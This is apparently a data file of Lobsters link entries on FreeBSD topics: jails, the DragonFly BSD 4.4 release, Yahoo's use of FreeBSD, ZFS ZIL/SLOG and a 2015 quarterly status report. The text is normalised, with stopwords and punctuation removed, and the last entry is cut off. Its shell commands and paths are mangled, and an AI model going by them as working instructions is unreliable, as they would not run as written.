570,Lobsters,freebsd,FreeBSD,FreeBSD Jails the hard way,https://clinta.github.io/freebsd-jails-the-hard-way/,freebsd jail hard way,full jail signed checksum creating template deploying template zfs snapshot thin jail using nullfs mount detail simplifying jailconf jailconf jail,many great option managing freebsd jail iocage warden ezjail aim streamline process make quick easy get going sometimes tool built right o overlookedthis post go involved creating managing jail using tool built freebsdfor guide going putting jail usrlocaljailsi start simple isolated jail go use zfs snapshot lastly nullfs mount share freebsd base file multiple jailsi also show example use templating power jailconf apply similar setting jailsfull make directory jail zfs dataset prefermkdir p zfs create mountpointusrlocaljails zrootjails zfs create download freebsd base file part freebsd want example include bit library wellfetch ftp tmpbasetxz tar xvf tmpbasetxz c fetch ftp tar xvf c fetch ftp tmpportstxz tar xvf tmpportstxz c update freebsd base installenv freebsdupdate b usrlocaljailsfulljail fetch install verify download downloading archive ftp confirm download valid tampered freebsdupdate id command verifies installation using pgp key base system presumably installed iso verified using freebsd signed checksum admittedly step bit paranoia think prudentenv freebsdupdate b usrlocaljailsfulljail id make sure jail right timezone dns server hostname rcconfcp etcresolvconf cp etclocaltime echo hostname edit jailconf detail jail etcjailconf global setting applied jail execstart binsh etcrc execstop binsh etcrcshutdown execclean mountdevfs jail definition hosthostname path interface start login command config file tedious way make jail little bit templating even easier start making template making template basically step different destination folder condense herecreating create template zfs dataset like use zfs clone method deploying template need create zfs dataset instead foldermkdir p zfs create p fetch ftp tmpbasetxz tar xvf tmpbasetxz c fetch ftp tar xvf c fetch ftp tmpportstxz tar xvf tmpportstxz c cp etcresolvconf cp etclocaltime update template freebsdupdateenv freebsdupdate b fetch install verify installenv freebsdupdate b id fully date jail template made template zfs easily deploy using zfs snapshotsdeploying template zfs create snapshot last freebsdupdate template brought patch level call snapshot snapshot clone snapshot new jailzfs clone configure jail hostnameecho hostname add jail definition jailconf make sure global jail setting jailconf listed fulljail example jail definition hosthostname path interface start jailthe downside zfs approach jail fully independent need update jail update individually sharing template using nullfs mount one copy base system need updated oncethin jail using nullfs mountsthis section changed detailsthis method little bit tricky take note directory local jail universal freebsd fortunately freebsd directory structure stable predictable benefit method allows update base image port tree method requires slightly different template zfs method either copy template created previous instruction use zfs clone itcp r zfs create zrootjailstemplates zfs clone addition base template need create skeleton template hold directory local jail going copy directory template skeletonmkdir p zfs create p mkdir p mv mv mv mv mv skeleton directory going copied new jail going mounted skeleton inside jail readonly base template need create symlink expected location appropriate directory inside skeleton directory important cd jail directory create symlinks relative path way always link correct location matter base template end mountedcd mkdir skeleton ln skeletonetc etc ln skeletonhome home ln skeletonroot root ln skeletonusrlocal usrlocal ln skeletonusrportsdistfiles usrportsdistfiles ln skeletontmp tmp ln skeletonvar var edit makeconf port workdirectory located inside skeleton directoryecho wrkdirprefix skeletonportbuild copy skeleton jail use plain old copy zfs snapshotszfs snapshot skeleton zfs create zrootjailsthinjails zfs clone skeleton mkdir usrlocaljailsthinjails cp r add hostname jail rcconfecho hostname make jail directory base template skeleton folder mountedmkdir p create jail entry etcjailconf sure include global jail configs listed fulljail example jail definition hosthostname path interface mountfstab create jail fstab nullfs ro nullfs rw start jailnow create dozen thinjails run env freebsdupdate b fetch install jail updated run portsnap p auto port tree jail updated one easy place backup save jail customizations usrlocaljailsthinjailssimplifying jailconfjailconf actually fairly powerfull tool take advantage feature man page go detail use variable example give enough detail see useful option specified jail command included jailconfif followed three example jailconf looking something like etcjailconf global setting applied jail execstart binsh etcrc execstop binsh etcrcshutdown execclean mountdevfs jail definition hosthostname path interface jail definition hosthostname path interface jail definition hosthostname path interface mountfstab greatly simplified using inheritence feature jailconf first low hanging fruit interface every jail moved global setting applied every jail global setting applied jail interface hostnames path slightly differnet based name jail jailconf name jail accessable via variable name also moved global setting global setting applied jail interface hostname namedomainlocal path usrlocaljails name address also nearly varying one number use custom variable simplify allow u change subnet jail one config need move server new network future global setting applied jail interface hostname namedomainlocal path usrlocaljails name ip lastly mountfstab line let assume future jail going create fstabs usrlocaljails namefstab first three created defining fstab global setting removing first two jailssimplified new jailconf look like new jail require line config fstab global setting applied jail interface hosthostname namedomainlocal path usrlocaljails name ip mountfstab usrlocaljails namefstab execstart binsh etcrc execstop binsh etcrcshutdown execclean mountdevfs jail definition ip mountfstab jail definition ip mountfstab jail definition ip hopefully helped understand process create manage freebsd jail without tool abstract away detail tool often quite useful always benefit learning thing hard way case hard way seem hard
571,Lobsters,freebsd,FreeBSD,FreeBSD on Raspberry pi,https://github.com/freebsd/crochet/pull/140,freebsd raspberry pi,join github today sign,dismiss join github today github home million developer working together host review code manage project build software together sign
574,Lobsters,freebsd,FreeBSD,DragonflyBSD 4.4 Released,https://www.dragonflybsd.org/release44/,dragonflybsd released,dragonfly bsd bigticket item improved graphic support collation support locale regex library replaced tre change linker default change since dragonfly kernel graphic networking driver userland various tool upgraded base system removed base system hammer improvement improvement status clang status,dragonfly bsd version never officially released version released dec version released feb version released april dragonfly version bring update accelerated video radeon user new locale system new default linker significant behindthescenes work also done symbol versioning improvement change version first release due late inclusion openssl update version released include openssl plus update iwm miscellaneous bugfixes version includes openssl skylake network support bugfixes update detail commits branch available associated commit message bigticket item improved graphic support radeon driver updated match version found linux kernel collation support dragonfly first bsd properly support collation named locale mean data sorted per rule language territory selected release data would sorted posix standard basically order character set lack collation support manifested various way eg french german sorting would completely wrong people would often notice collated database would return query result set wrong order wellknown example postgresql database collation field way get result proper order graft icu postgresql nondefault port option approved postgresql project postgresql database use libc provide proper result box collation defintions cldr unicode common locale data repository dragonfly imported release collation format generation tool libc handling derived illumos project since longstanding goal freebsd collation code dragonfly already imported freebsd current available release boast dragonfly bsd support named locale collation limited time significant collaboration freebsd dragonfly bug discoveryfixingrb tree patch fed back illumos positive fo story resulting common locale solution three platform locale locale support dragonfly occasionally synchronized freebsd year freebsd support static release brings complete overhaul locale system data six locale category lcctype lccollate lctime lcnumeric lcmonetary lcmessages come single authoritarian source unicode cldr project http cldrunicodeorg release cdlr unicode fairly frequent used generate posixformatted input file keeping locale data date future intended regular maintenance lccollate support impactful change locale user immediately notice improvement numeric time monetary string handling usability ctype defintions merged one map including signicant handcreated data file provide comprehensive encoding cover supported many unsupported language rather use strict narrow perlocale cldr ctype definition threecomponent locale name introduced common example srcyrlrs srlatnrs zhhanscn zhhanttw etc introduced short code code like dede frfr enus elgr etc shortcodes generally mapped character set ia sometimes mapped traditional singlebyte encoding nt adequately cover locale anymore eg currency supported took opportunity intelligently limit locale supported example locale support either generally mean used western europe rest locale remain older several older encoding eliminated note necessary keep zhcn prefix due compatibility issue nvi party software regex library replaced tre consequence locale upgrade original regex library forced posix singlebyte mode always support multibyte character nt turned tre regex library written ville laurikari already used musl library latest macos latter significantly modified keep freebsd legacy support specific token also added bracket pattern matching dragonfly regex library match apple version feature performance score extremely high regex testsuite much higher original library regression recent addition token support bracket equivalent work fine tre faster capable support multibyte character nice addition release change linker default dragonfly us gold linker default legacy ldbfd linker still available permanently reselected key definition makeconf file change since dragonfly kernel improved cpu power saving setting reduced file allocationfree contention reduce kqueue contention implemented lwpsetname system call fixed dsp nonblocking operation support add aperf driver display effective cpu frequency numerous cleanup fix hammer sync acpica mostly finished removing bit adjust boot loader heap handle larger md image cleanup pas dead kernel code syslink remains etc dsched removed issue bug nt work well ssds recode pager algorithm lowmemory outofmemory pkill graphic drmradeon driver match linux kernel support valleyviewbaytrail cherryview atom socs broadwell gpus fully accelerated preparatory work skylake support system console support drm graphic default virtual terminal nt show black screen anymore xorg started one km kernel module loaded improved power management panel self refresh available hardware temperature sensor supported radeon hardware networking realtek support iwm driver added updated rtadvd updated rtadvctl added asynchronous udp connection handling much greater load new larger tcp starting window highlatency connection kernel nmbcluster value liveadjustable extreme traffic networking stabilize unix domain socket new gc code fdpassing unix domain socket misc sync freebsd improved socket performance tcp udp improved tcp connect local port selection added accept system call added support sockcloexec socknonblock socket flag make hw flow control feature available ifconfig add tunables allow nfsroot iosize readahead set bring expanded ipfw freebsd called dfly driver midi support readded many bugfixes device mapper dmdelay dmflakey added device mapper usb modem work better least nt panic kernel improved access ram ecc feature status wlan updated freebsd prior splitdevice removal userland regex library replaced multibyte generally much capable tre regex library match osx feature df first bsd move tre macos libm replaced openbsd version collaborative work progress libc feature symbol versioning enable binary created release execute dragonfly year future complete overhaul update locale including implementation collation malloch removed dragonfly first bsd remove header libstdc modified enable full usage function clang consequence locale update output l long format format changed named locale use notably long format month always abbreviated english using posix definition thus guaranteed fast three letter wide year hour second information always displayed cposix locale change l output future timestamp handling corrected match posix standard requirement wpa supplicant base used delay boot message displayed strongly recommends dports version securitywpasupplicant used instead improved powerd improved top p output lwps kernel thread fixed support pthreadsetnamenp ported tcpdrop addition many new locale including six arabic locale uae saudi arabia egypt jordan morocco qatar additional spanish locale mexico argentina costa rica additional english locale phillipines singapore hong kong corrected norwegian locale nb nn extended swedish finland sami finland norway serbian presented cyrillic latin form locale provides complete list rtadvc imported freebsd rtsold updated various tool upgraded base system updated version libexecinfo added synced freebsd iconv synchronized freebsd openssl updated xz updated libedit updated version binutils updated grep updated tcsh updated libdialog updated tn ftp updated oct gcc updated acpica updated sort come netbsd replaced freebsd version localedef internal tool origin illumos internal tool origin abandoned freebsd project extended df tzdata updated removed base system hostapd latest version available via dports nethostapd mklocale replaced localedef colldef replaced localedef hammer improvement many many cleanup fix thanks tomohiro kusumi improvement dports count hovering around port many previously broken port fixed regular user due contribution offered github pull request mechanism thanks six official set dragonfly wallpaper available pkg install dragonflywallpapers automatically installed preselected kde user automatically installed user wallpaper still manually selected desktop least get installed sharewallpapers symlinked sharebackgroundsdragonfly status new release support root mount live dedup filesystems set singlehost testing bulkfree scan currently automated space condition currently recoverable since everything copyonwrite additional mechanism needed allow outofspace condition rectified option added build piece experiment unless data lose ready primetime medium format continue change incompatible way work generally progressed frontend essentially stable passing filesystem stress test solution hardlink problem related renames directory along path hardlink breaking hardlink put place physical hardlink target previously stored common parent directory v link hardlink target placed even higher directory tree common directory directory xlink chflag set renames across xlink point allowed work continues backend really sophistication going backend threaded one thread per physical drive frontend replicates dispatch request collect result performs cluster operation quorum validation capable detaching aborting remainder request sufficient progress made idea stuck physical drive cascade back frontend cause frontend get stuck work preliminary design feel solid far note clustering function yet ready testing manner clang status clang dport mostly work dragonfly officially supported kernel bootloader build track correct number issue clangbuilt boot loader ultimately intention make clang one dragonfly builtin compiler dragonfly always ship two right default
575,Lobsters,freebsd,FreeBSD,Yahoo! and FreeBSD,http://zer0.org/daemons/yahoobsd.html,yahoo freebsd,,yahoo began life stanford university dec alpha box running osf sparc running sunos served u well first year learned neither system really designed handling large number http request fact unable find commercial system addressed problem facing scalability one unfortunate reality forefront web technologyafter leaving stanford used platform including sgi irix linux bsdi impressed anything used term performance stability still looking alternative yahoo grew popular scalability stability becoming critical success time none u knew anything freebsd seeing reference thought give try spend many frustrating hour trying install pc o bit skeptical intention spending three day trying install yet another one surprise went freebsd web site downloaded floppy boot image booted pc created floppy answered install question minute later freebsd installing net real surprise cam back later fully configured system actually worked anything gone wrong install would likely end trial luckily u easiest painless o installs ever experienced couple day later added freebsd box cluster web server outperform rest machine stable week experiment sold although price certainly attractive stability performance access sourcode sold u ever since used freebsd almost exclusively production well development environmentearly two big unknown support issue future direction freebsd support received core team well user excelent support along source code allowed u solve issue almost immediately likewise pleasantly surprised organization direction freebsd project learned people involved last two year started single pentium box running freebsd eventually migrated rest production server freebsd today server running various version stable process testing stable hope convert next month machine use range pentium memory memory additional io performance needed use ccd stripping multiple disk fast ethernet used networking overall extremely cost effective solution freebsd extremely stable u seen day uptime machine serving million http request per day performance impressive disk striping using ccd able serve million http request per day memory one negative thing found freebsd lack third party software fortunately changing still long way go way change yahoo along organization convince software vendor big enough market productsone big technical challenge scaling service face rapid growth looking forward interested using smp achieve even better priceperformance freebsd platform eg alpha also interesting priceperformance perspective also looking freebsd provide service large reliable raid file server overall found freebsd excel performance stability technical support course price two year discovering freebsd yet find reason switch anything else david filo cofounder yahoo taken freebsd news issue
577,Lobsters,freebsd,FreeBSD,Serving one-third of the Internet via FreeBSD,https://www.youtube.com/watch?v=FL5U4wr86L4,serving onethird internet via freebsd,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature nycbsdcon serving onethird internet via freebsd youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature nycbsdcon serving onethird internet via freebsd youtube
578,Lobsters,freebsd,FreeBSD,FreeBSD: Assembly language writing tutorial,http://www.int80h.org/bsdasm/,freebsd assembly language writing tutorial,processing program input offering option output,ready decide exactly want pinhole software processing program input since main purpose help u design working pinhole camera use focal length input program something determine without software proper focal length determined size film need shoot regular picture wide angle picture telephoto picture program written far worked individual character byte input hex program converted individual byte hexadecimal number csv program either let character deleted changed different character etc one program ftuc used state machine consider two input byte time pinhole program work individual character deal larger syntactic unit example want program calculate pinhole diameter value discus later focal length mm mm mm may want enter something like program need consider single byte input time see first must understand seeing first digit decimal number see must know seeing digit number encounter first comma must know longer receiving digit first number must able convert digit first number value digit second number value course digit third number numeric value need decide delimiters accept input number separated comma treat two number separated something else personally like keep simple something either number process number discard like computer complaining typing extra character obvious extra character duh plus allows break monotony computing type query instead number best pinhole diameter focal length reason computer spit number complaint syntax error syntax error syntax error syntax error best et cetera et cetera et cetera secondly like character denote start comment extends end line take much effort code let treat input file software executable script case also need decide unit input come choose millimeter photographer measure focus length finally need decide whether allow use decimal point case must also consider fact much world us decimal comma case allowing decimal pointcomma would offer false sense precision little noticeable difference focus length allowing user input something like good idea opinion mind one writing program make choice course offering option important thing need know building pinhole camera diameter pinhole since want shoot sharp image use formula calculate pinhole diameter focal length expert offering several different value pc constant need choice traditional unix programming two main way choosing program parameter plus default time user make choice two way choosing one allow relatively permanent choice applies automatically time software run without u tell want permanent choice may stored configuration file typically found user home directory file usually name application started dot often rc added file name could pinhole pinholerc mean current user home directory configuration file used mostly program many configurable parameter one often use different method expect find parameter environment variable case might look environment variable named pinhole usually program us one method otherwise configuration file said one thing environment variable another program might get confused complicated need choose one parameter go second method search environment variable named pinhole way allows u make ad hoc decision though usually want use time want word allows u override permanent choice type choice usually done command line parameter finally program always need default user may make choice perhaps know choose perhaps browsing preferably default value user would choose anyway way need choose rather choose default without additional effort given system program may find conflicting option handle way find ad hoc choice eg command line parameter accept choice must ignore permanent choice default otherwise find permanent option eg environment variable accept ignore default otherwise use default also need decide format pc option first site seems obvious use format environment variable command line allowing actually security risk pc constant small number naturally test software using various small value pc happen someone run program choosing huge value may crash program designed handle huge number may spend time program handle huge number might writing commercial software computer illiterate audience might say tough user know better may make impossible user enter huge number approach take use implied prefix word user want expect type set environment say interpret ridiculous least safer secondly many user want go either bender constant connors constant make easier interpret b identical c identical output need decide want software send output format since input allows unspecified number focal length entry make sense use traditional output showing result calculation focal length separate line separating value one line tab character optionally also allow user specify use csv format studied earlier case print line name describing field every line show result substituting comma tab need command line option csv format use c already mean use connors constant strange reason many web site refer csv file excel spreadsheet though csv format predates excel therefore use e switch inform software want output csv format start line output focal length may sound repetitious first especially interactive mode user type focal length repeating user type several focal length one line input also come file output another program case user see input token output go file want examine later could go printer become input another program make perfect sense start line focal length entered user wait entered user user type something like clearly need strip leading zero might consider reading user input converting binary inside fpu printing user type something like ha packed decimal fpu format let u input number user entered digit handle well could modify code read first digit enter fpu read multiply already tos raised number additional digit add yes could program would ridiculous different one may thing even circumference earth expressed millimeter take digit clearly build camera large yet anyway user enters huge number either bored testing u trying break system playing anything designing pinhole camera slap face manner speaking achieve simply ignore leading zero find digit initialize counter start taking three step send digit output append digit buffer use later produce packed decimal send fpu increase counter taking three step also need watch one two condition counter grows stop appending buffer continue reading digit sending output rather next input character digit done inputting incidentally simply discard unless must return input stream start comment must see done producing output start looking input still leaf one possibility uncovered user enters zero several zero never find display determine happened whenever counter stay case need send output perform another slap face displayed focal length determined valid greater exceeding digit calculate pinhole diameter coincidence pinhole contains word pin indeed many pinhole literally pin hole hole carefully punched tip pin typical pinhole small formula get result millimeter multiply output result micron point yet another trap face much precision yes fpu designed high precision mathematics dealing high precision mathematics dealing physic optic specifically suppose want convert truck pinhole camera would first one suppose box meter long focal length well using bender constant give u square root multiplied millimeter micron put either way result absurdly precise truck exactly millimeter long measure length precision stating need pinhole diameter millimeter well deceiving millimeter would fine nb used ten digit example imagine absurdity going need limit number significant digit result one way using integer representing micron truck would need pinhole diameter micron looking number still decide micron millimeter close enough additionally decide matter big result get want display four siginificant digit number course ala fpu offer rounding specific number digit view number decimal binary therefore must devise algorithm reduce number significant digit mine think know better one please let know initialize counter number greater equal divide increase counter output result counter greater output decrease counter nb good want four significant digit number significant digit replace raised number significant digit output pinhole diameter micron rounded four significant digit point know focal length pinhole diameter mean enough information also calculate display rounded four significant digit chance tell u little make meaningful find nearest normalized ie nearest power square root multiplying actual course give u square calculate logarithm much easier calculating logarithm round result nearest integer next raise result actually fpu give u good shortcut use fscale op code scale analogous shifting integer left finally calculate square root nearest normalized sound much work may become much clearer see code take op code altogether fmul fld frndint fscale fsqrt fstp first line fmul square content tos top stack st called nasm push tos next line fld push square back tos point square st st become clear leave second copy stack moment st contains next calculates logarithm st multiplied st placed st point st contains logarithm calculated st contains square actual saved later frndint round tos nearest integer push fscale shift tos value st effectively raising st finally fsqrt calculates square root result ie nearest normalized nearest normalized tos logarithm rounded nearest integer st square actual st saving value st later need content st anymore last line fstp place content st st pop result st st st st etc new st contains normalized new st contains square actual stored posterity point ready output normalized normalized round four significant digit send full precision normalized fnumber useful long reasonably small found light meter otherwise need different method determining proper exposure earlier figured formula calculating proper exposure arbitrary measured different every light meter ever seen determine proper exposure therefore calculate multiplier ie much need multiply exposure measured determine proper exposure pinhole camera formula know factor calculated dividing actual one normalized one squaring result mathematically dividing square square give u result computationally want square two number square one first solution seems better first constant fpu waste precious cycle tell divide square whatever equal divide square result two way seem equal studied principle photography remember actually square root raised fifth power irrational number square number exactly integer power need divide square need use fscale shift right five position fpu lingo mean fscale st equal much faster division become clear saved square top fpu stack calculation multiplier easiest calculation entire program output rounded four significant digit one useful number calculate number stop may help u outside range light meter shutter let u set various speed shutter us stop say stop light meter say use sec set shutter speed first move dial stop calculation quite easy well calculate logarithm multiplier calculated though need value rounded output result rounded nearest integer need worry four significant digit one result likely one two digit anyway
579,Lobsters,freebsd,FreeBSD,ZFS ZIL and SLOG demystified,http://www.freenas.org/whats-new/2015/11/zfs-zil-and-slog-demystified.html,zfs zil slog demystified,zfs zil slog demystified freenas freenas blog first thing understand zfs behaves like file system regard writes asynchronous unless requested otherwise write behavior taken granted modern computing caveat buffered writes simply lost case kernel panic power loss default shortterm zil storage exists hard disk longterm pool storage expense data written disk twice shortterm zil across longterm pool optimal slog device small flashbased device ssd nvme card thanks inherent highperformance low latency course persistence case power loss wwwixsystemscom sale ixsystemscom,zfs zil slog demystified nov freenas freenas blog zil slog two misunderstood concept zfs hopefully clear thing surely know zfs taking extensive measure safeguard data surprise two buzzword represent key data safeguard obvious however come play specific circumstance first thing understand zfs behaves like file system regard asynchronous synchronous writes data written disk either buffered ram operating system kernel prior written disk immediately written disk buffered asynchronous behavior often used perceived speed provides user synchronous behavior used integrity guarantee synchronous write reported successful application requested underlying disk confirmed completion synchronous write behavior determined either file opened osync flag set application underlying file system explicitly mounted synchronous mode synchronous writes desired consistencycritical application database network protocol nfs come cost slower write performance case zfs syncstandard property pool dataset provide posixcompatible synchronous requested write behavior syncalways force synchronous write behavior akin traditional file system mounted synchronous mode asynchronous unless requested otherwise write behavior taken granted modern computing caveat buffered writes simply lost case kernel panic power loss application file system vary handle interruption zfs fortunately guarantee lose second worth writes came last successful transaction group given choice performance asynchronous writes integrity synchronous writes compromise achieved zfs intent log zil think zil streetside mailbox large office fast use postal carrier perspective secure office perspective mail mailbox mean sorted final destination yet synchronous writes requested zil shortterm place disk data land prior formally spread across pool longterm storage configured level redundancy however two special case zil used despite requested large block used logbiasthroughput property set default shortterm zil storage exists hard disk longterm pool storage expense data written disk twice shortterm zil across longterm pool disk perform one operation time performance penalty duplicated effort alleviated sending zil writes separate zfs intent log slog simply log using spinning hard disk slog yield performance benefit reducing duplicate writes disk poor use hard drive given small size high frequency incoming data optimal slog device small flashbased device ssd nvme card thanks inherent highperformance low latency course persistence case power loss mirror slog device additional precaution surprised speed improvement gained gigabyte separate log storage storage pool write performance allflash array capacity traditional spinning disk array ship every spinningdisk truenas system highperformance flash slog make standard option freenas certified line thank matthew ahrens openzfs project reviewing article learn ixsystems storage solution visit wwwixsystemscom call one consultative advisor email u sale ixsystemscom
580,Lobsters,freebsd,FreeBSD,"FreeBSD Quarterly Status Report, Jul-Sept 2015",https://www.freebsd.org/news/status/report-2015-07-2015-09.html,freebsd quarterly status report julsept,introduction clusteradm freebsdorg core freebsdorg jmg freebsdorg open task grehan freebsdorg neel freebsdorg tychon freebsdorg freebsd allanjudecom editor callfortestingorg open task http githubcomallanjudebhyveucl dim freebsdorg emaste freebsdorg rdivacky freebsdorg davide freebsdorg open task gnn freebsdorg freebsd gremde mav freebsdorg njwilliams swineduau open task mihai freebsdorg grehan freebsdorg open task trasz freebsdorg freebsdorg open task jdeboynepollardnewsgroups ntlworldcom open task emaste freebsdorg marcel freebsdorg open task mav freebsdorg eric metricspacenet open task jmg freebsdorg open task kda semihalfcom zr semihalfcom open task ed freebsdorg open task royger freebsdorg juliengrall citrixcom open task jimharris freebsdorg cem freebsdorg open task gnn freebsdorg jmg freebsdorg eri freebsdorg open task kib freebsdorg alc freebsdorg bde freebsdorg der semihalfcom wma semihalfcom zbb semihalfcom open task andrew freebsdorg open task andrew freebsdorg emaste freebsdorg open task br freebsdorg arunthomas baesystemscom emaste freebsdorg bapt freebsdorg pkg freebsdorg open task bapt freebsdorg allanjude freebsdorg open task jhb freebsdorg bdrewery freebsdorg open task jhb freebsdorg open task port tocodomainsde port michaelfaustende open task freebsdgnome freebsdorg open task kde freebsdorg open task olivierd freebsdorg npm package registry open task portmgrsecretary freebsdorg portmgr freebsdorg open task danfe freebsdorg open task xfce freebsdorg open task freebsddoc freebsdorg freebsdtranslators freebsdorg wblock freebsdorg open task wblock freebsdorg open task loo freebsdorg gmailcom open task michal freebsdorg brook freebsdorg open task btw freebsdorg hiren freebsdorg gnn freebsdorg rwatson freebsdorg clord freebsdorg deb freebsdfoundationorg jason zfsgurucom open task news home status home,introductionthe third quarter july september period busy activity freebsd second quarter row largest report yet publishedthe foundation continues play strong role bringing developer evangelist presence conference funding much hardware cluster administration team us keep thing running sponsoring many development project freebsd quarter also hear student project funded google summer code ranging wide gamut bootloader additional arm support also range completion status gsoc output tree already others could benefit additional attention help budding new contributor schedule fill return classeszfs network stack continue strong area freebsd receiving active maintenance feature improvement quarter substantial work continues potentially putting path toward promotion status new port riscv architecture made great headway short period time strength exciting new area seen attention cycle also part system frequently perceived unchanging infrastructure received attention improvement truss k gdb receiving significant overhaul new implementation man page tool brought website receiving new skin brand new system translating documentation greatly lower barrier entrynonetheless despite record length report cover work done freebsd throughout reporting period many bug fix minor mention developer busy working next project write entry previous project developer committing subversion comprise ongoing activity freebsd also user testing unreleased code reporting bug released code participant mailing list forum helping solve problem even chat irc wander far stated topic channel contribute community around freebsd community whose effectiveness helpfulness key component effectiveness usefulness freebsd developer listed report everyone community thank making freebsd great operating kadukplease submit status report fourth quarter october december january contact freebsd cluster administration team clusteradm freebsd cluster administration team consists people responsible administering machine project relies distributed work communication synchronised primary cluster hosted guest california many year ongoing project relocating core functionality location new jersey formal hosting arrangement equipment refresh consolidation better use resource better continuity service significant amount behindthescenes work make happen original cluster implemented common shared assumedtobe secure network ubiquitous nfs everywhere structure lend well distributed across geographically diverse location particularly internet transit required bulk work rebuilding service portable standalone component depend sharednetwork access safe enough use across insecure internet highlight quarter many internal distribution system switched rsync distribution mesh using syncthing implemented codedata signing infrastructure outofband verification new reference build host online internal admbugs switched bugzilla package made available bugmeister team finally switched exorcised hubfreebsdorg last survivor security incident vuxml legacy portaudit build system converted component integrated http downloadfreebsdorg nearing completion please use officially announced taiwan node brought service pkg ftp svn vuxml mirroring one freebsdupdate mirror converted lighttpd nginx due data corruption bug completed detachment svn repository old cluster moved new location ongoing cluster run mixture part eat dogfood project useful monthly cluster refreshes keep current code build internal base system snapshot every day package every day also provide support nonclusteradmoperated service including jenkins review portsnap freebsdupdate bugzilla package builder git mercurial varies little maintaining ssl frontends operating server distributing data building packagesbinaries run contact freebsd release engineering team freebsdorg freebsd release engineering team responsible setting publishing release schedule official project release freebsd announcing code freeze maintaining respective branch among thing midaugust freebsd release engineering team released freebsd two week earlier original schedule anticipated freebsd release engineering team would like thank tested beta rc build reported issue release cycle freebsd release engineering team approval freebsd core team appointed marius strobl deputy lead project sponsored freebsd foundation contact freebsd core team core freebsdorg biggest task handled core team quarter developing publishing new code conduct code conduct describes people expected behave freebsd official communication channel well developer people involved project behave representing project public code conduct generally well received elicited numerous comment suggestion improvement community many integrated next task handled core restoration babak farrokhi port commit bit babak resides iran year ago legal advice suggested allowing contribution iranian resident might violate u trade sanction several year core asked revisit issue advice counsel core decided could restore commit privilege commmitters residing iran ctm service came security review given lack use routine authenticity checking made injection trivial exploit code relatively easy service held risky continue official part freebsd base system ctm remaining user able install ctm port collection order continue core learned isc ceasing hosting service entailed rapid rework plan movement significant portion freebsd cluster data center cluster administration taken ownership situation making progress core fielded enquiry nextbsd whether future direction whole freebsd project core position nextbsd interesting project regard like bsd project potential source good idea however currently plan adopt nextbsd official freebsd distribution beyond issue core also spent time various routine activity quarter issued three new src commit bit took none safekeeping welcome allan jude marcelo araujo andriy voskoboinyk contact johnmark gurney jmg freebsdorg automtud script allow freebsd machine send jumbo frame machine support using normalsized frame machine various advantage using jumbo frame reduced protocol overhead also mean tcp stream segmented much although tso help mitigate disadvantage segmentation case lro work well fewer packet received script currently restore system original state exit mean must manually change interface mtu delete host route stopping script open task fix various ethernet driver better support jumbo frame ethernet driver though support scattergather use physically contiguous zone cause resource shortage testing needed ensure thing behave expected mean running script communication machine function normally without slowdown connectivity issue check vmstat z grep mbuf ensure issue due running buffer due ethernet driver issue contact peter grehan grehan freebsdorg contact neel natu neel freebsdorg contact tycho nightingale tychon freebsdorg contact allan jude freebsd allanjudecom contact michael dexter editor callfortestingorg bhyve hypervisor run platform present run freebsd later linux openbsd illumos window guest current development focused enabling additional guest operating system implementing feature found hypervisors combined bhyve zfs bof held vbsdcon hosted michael dexter allan jude question asked bhyve included live migration suspendresume support configuration using zfs three bhyverelated project selected gsoc device emulation porting bhyve arm ptnetmap support major enhancement bhyve quarter support external firmware along port intel uefi firmware allows bhyve run window headless mode also illumos open task improve documentation bhyveucl workinprogress script starting bhyve instance based libucl config file information http githubcomallanjudebhyveucl add support virtioscsi flexible networking backends wanproxy vhostnet support running bhyve nonroot add filter popular vm file format vmdk vhd implement abstraction layer video sdl base system suspendresume support live migration nested vtx support bhyve bhyve support architecture arm mips ppc contact dimitry andric dim freebsdorg contact ed maste emaste freebsdorg contact roman divacky rdivacky freebsdorg contact davide italiano davide freebsdorg updated clang llvm lldb compilerrt libc base release contain numerous improvement please see linked release note detailed information brings u completely uptodate latest upstream version project meanwhile ed maste working importing llvmorg version libunwind like release component require support build point freebsd later provide support least currently solid plan mfc version stable branch due difficulty would introduce usual upgrade scenario thanks ed maste andrew turner help import thanks antoine brodin several port expruns first port exprun major problem found one introduced clang bug caused pow generate floating point exception case turn caused libpng fail build one bug libjpegturbo caused undefined behavior two problem took time fix another exprun done resulted dozen newly failed port almost new failure fix submitted linked original pr exprun open task commit port fix dependency pr test report issue new tool chain contact george nevilleneil gnn freebsdorg advent dtrace able replace many internal kernel debugging option tcpdebug statically defined tracepoints sdts tracepoints added system replicate functionality tcpdebug kernel option new kernel option need added standard kernel dtrace included default generic kernel head project sponsored limelight network contact michael gmelin freebsd gremde acer chromebook affordable powerful little laptop provides battery life six hour running freebsd great machine travelling coding general machine fully functional meaning essential device work keyboard trackpad light sensor backlight control display vesa mode fast external display hdmi vesa mirror mode sound usb port sd card slot camera atheros wireless quarter project extended previous work boot process keyboard driver well smbus driver added three new driver bus cyapa trackpad isl ambient light sensor much development originally done late since patch massively improved merged head relevant device work without manual patching unable run head backported patch thanks everyone helped process could nt done without know contact alexander motin mav freebsdorg cam target layer ctl originally developed copansgi support high availability clustering unfortunately significant portion ha code never published main body source code missing part reimplemented scratch fixed improved code support dualnode ha asynchronous lun unit access alua four mode activeunavailable without interlink node secondary node report nothing except presence activestandby secondary node handling basic lun discovery reservation synchronizing state command execution primary node interlink activeactive node processing command accessing backing storage synchronizing state command execution primary node interlink activeactive secondary node backing storage access instead working proxy transferring command first node execution interlink case lost interlink connectivity primary node secondary node fall transitioning state like unavailable answer request make initiator wait recovery cluster failover ctl also got large number improvement including support emulation cddvd drive removable disk live lun reconfiguration code committed freebsd head recently merged branch project sponsored ixsystems inc contact nigel williams njwilliams swineduau multipath tcp mptcp extension tcp allows use multiple network interface standard tcp session addition new address scheduling data across occurs transparently perspective tcp application goal project deliver mptcp kernel patch interoperates reference mptcp implementation along additional enhancement aid network research patch released first patch rewritten implementation process documenting new design addressing feedback provided community work commenced improved input handling current method receiving reassembling segment cause instability stall connection shutdown involve reusing subflow receive buffer upcall enqueue mplayer reassembly task without need take lock mp control block improvement also allow bypassing mptcpusrreq standard tcp connection mptcp commit history synchronized hgbetafreebsdorg made repository available bitbucket see link future patch release tagged tree merged freebsd head weekly updated patch ready release project sponsored freebsd foundationopen task release patch populate documentation issue tracker bitbucket repository improvement receiveside code testing prepare technical report detailing design current patch contact mihai carabas mihai freebsdorg contact peter grehan grehan freebsdorg summer started porting bhyve onto platform lowlevel routine arm processor rewritten trying preserve hypervisor api originally created architecture managed bring freebsd guest point initializing interrupt still work done order virtualize interrupt timer 